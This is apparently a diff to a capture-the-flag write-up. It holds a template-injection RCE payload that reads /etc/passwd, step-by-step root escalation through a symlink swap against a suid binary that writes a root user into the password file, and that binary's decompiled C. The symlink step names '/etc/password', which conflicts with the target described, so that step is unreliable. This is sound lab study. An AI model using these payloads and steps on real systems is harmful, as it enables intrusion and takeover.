@@ -10,7 +10,22 @@ To bypass this, I created two users: one with the name and password `test` and t
 
 Once done, I could buy the premium feature, which turned out to be a simple calculator field. Given that the server reports itself as running express, a nodejs web framework, I tried an injection payload which worked to achieve RCE: `{{root.process.mainModule.require('child_process').spawnSync('cat',['/etc/passwd']).stdout}}`.
 
+After getting a reverse shell on the machine, whats immediately obvious is a directory under the user brian's home directory called 'admin'. In there is a suid binary called manageaccounts, which reads .account files and can add notes etc. To further examine this binary, I extracted it and decompiled it in ghidra, analysing the code and naming variables - the result is in the second sub heading below.
 
+The code reads a file that ends with .account (which can be a symbolic link), reading three lines from it (account type, note and money amount). The note can be changed but not the money amount, and then it can be written back to the file. It also writes a log file, with some escaping. The log file and the note changing are unnecessary however - key is that the binary will write anywhere as its suid, and that the file it reads (containing whatever strings) can be written anywhere by removing the file and placing a symbolic link with the same name pointing to the target. Accordingly, the following steps were used to get a new root user on the machine:
+
+1. create a file called `test.account`. This file should have content like the following:
+
+    a
+    brian::1000:1000:brian:/:/bin/sh
+    user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root:/bin/bash
+    
+2. run manageaccounts, and open the test.account file with the `f` command.
+3. in a separate window, remove the test.account file.
+4. create a new symbolic link with `ln -s /etc/password test.account`
+5. back in the manageaccounts interface, use `w` to write the output, then `q` to exit the app.
+
+At this point `su user3` and the password `pass123` will switch to the root account.
 
 ## Rust race condition exploiter.
 
@@ -105,4 +120,184 @@ async fn race_send(cookie: &str, target_user: &str, amount: i32) -> Result<()> {
     stream::iter(futures).buffer_unordered(CONCURRENT).collect::<()>().await;
     Ok(())
 }
+```
+
+## manageaccounts code
+
+```c
+  setresuid(0,0,0);
+  if (param_1 < 3) {
+    if (param_1 == 1) {
+      log_file_path = "log.txt";
+    }
+    else {
+      log_file_path = *(char **)(param_2 + 8);
+    }
+    log_file_handle = fopen(log_file_path,"w");
+    puts("Welcome to the bank API system user Brian!\n");
+    showhelp();
+    puVar3 = (undefined8 *)&account_opened;
+    for (lVar2 = 0x10; lVar2 != 0; lVar2 = lVar2 + -1) {
+      *puVar3 = 0;
+      puVar3 = puVar3 + (ulong)bVar4 * -2 + 1;
+    }
+    *(undefined4 *)puVar3 = 0;
+    *(undefined2 *)((long)puVar3 + 4) = 0;
+    entered_command = getChoice();
+    while (entered_command != 'q') {
+      valid_action = isValidAction((int)entered_command);
+      if (valid_action == '\0') {
+        puts("Unrecognised action. Type h for help.\n");
+      }
+      else {
+        fputc((int)entered_command,log_file_handle);
+        if (entered_command == 'h') {
+          showhelp();
+        }
+        else if (entered_command == 'f') {
+          puts("\nEnter the path to the account file you want to open:");
+          max_input = 0x20;
+          input = (char *)malloc(0x20);
+          getline(&input,&max_input,stdin);
+          local_1b8 = strchr(input,10);
+          if (local_1b8 != (char *)0x0) {
+            *local_1b8 = '\0';
+          }
+          input_len = strlen(input);
+          if (0x1e < input_len) {
+            puts("Filename too long...");
+            result_code = 1;
+            goto LAB_001014f8;
+          }
+          escape(input);
+          fprintf(log_file_handle," \'%s\' ",input);
+          iVar1 = EndsWith(input,".account");
+          if (iVar1 == 0) {
+            puts("That file does not end in .account!");
+          }
+          else {
+            account_file_handle = fopen(input,"r");
+            if (account_file_handle == (FILE *)0x0) {
+              puts("That account does not exist!");
+            }
+            else {
+              fgets(account_user_type,0xff,account_file_handle);
+              is_admin = account_user_type[0] == 'a';
+              fgets(account_note,0x32,account_file_handle);
+              fgets(account_money,0x32,account_file_handle);
+              fclose(account_file_handle);
+              strcpy(account_file_name,input);
+              account_opened = '\x01';
+              puts("File read successful!\n");
+            }
+          }
+        }
+        else if (entered_command == 'o') {
+          if (account_opened == '\0') {
+            puts("You have no account file open!");
+          }
+          else {
+            if (is_admin == '\0') {
+              puts("This user is a normal user.");
+            }
+            else {
+              puts("This user is an admin.");
+            }
+            printf("The user\'s note is: %s\n",account_note);
+          }
+        }
+        else if (entered_command == 'c') {
+          if (account_opened == '\0') {
+            puts("You have no account file open!");
+          }
+          else {
+            is_admin = is_admin == '\0';
+            if ((bool)is_admin) {
+              puts("The account type is now admin.");
+            }
+            else {
+              puts("The account type is now normal user.");
+            }
+          }
+        }
+        else if (entered_command == 'n') {
+          puts("\nEnter the new note for the file:");
+          max_input = 0x32;
+          input = (char *)malloc(0x32);
+          getline(&input,&max_input,stdin);
+          local_1c0 = strchr(input,10);
+          if (local_1c0 != (char *)0x0) {
+            *local_1c0 = '\0';
+          }
+          input_len = strlen(input);
+          if (0x30 < input_len) {
+            puts("Note too long...");
+            result_code = 1;
+            goto LAB_001014f8;
+          }
+          escape(input);
+          fprintf(log_file_handle," \'%s\' ",input);
+          if (account_opened == '\0') {
+            puts("Error: you need to load a file first!");
+          }
+          else {
+            strcpy(account_note,input);
+            puts("Note set successfully!");
+          }
+        }
+        else if (entered_command == 'w') {
+          if (account_opened == '\0') {
+            puts("You need to load a file first!");
+          }
+          else {
+            account_file_handle2 = fopen(account_file_name,"w");
+            if (is_admin == '\0') {
+              account_user_type_to_set = &char_a;
+            }
+            else {
+              account_user_type_to_set = &char_v;
+            }
+            fprintf(account_file_handle2,"%s\n",account_user_type_to_set);
+            fprintf(account_file_handle2,"%s\n",account_note);
+            fprintf(account_file_handle2,"%s\n",account_money);
+            fclose(account_file_handle2);
+            puts("Changes written.\n");
+          }
+        }
+        else if (entered_command == 'm') {
+          if (account_opened == '\0') {
+            puts("You need to load a file first!");
+          }
+          else {
+            printf("This account currently has $%s\n",account_money);
+          }
+        }
+        else if (entered_command == 'd') {
+          puts("\nEnter your deletion request message:");
+          max_input = 0x32;
+          input = (char *)malloc(0x32);
+          getline(&input,&max_input,stdin);
+          local_1d0 = strchr(input,10);
+          if (local_1d0 == (char *)0x0) {
+            puts("Message is too long...");
+            result_code = 1;
+            goto LAB_001014f8;
+          }
+          *local_1d0 = '\0';
+          escape(input);
+          fprintf(log_file_handle," \'%s\' ",input);
+          if (account_opened == '\0') {
+            puts("Error: you need to load a file first!");
+          }
+          else {
+            puts("Your request has been logged.");
+          }
+        }
+      }
+      entered_command = getChoice();
+    }
+    fwrite(&char_q,1,2,log_file_handle);
+    puts("\nSaving log data...");
+    fclose(log_file_handle);
+    result_code = 0;
 ```
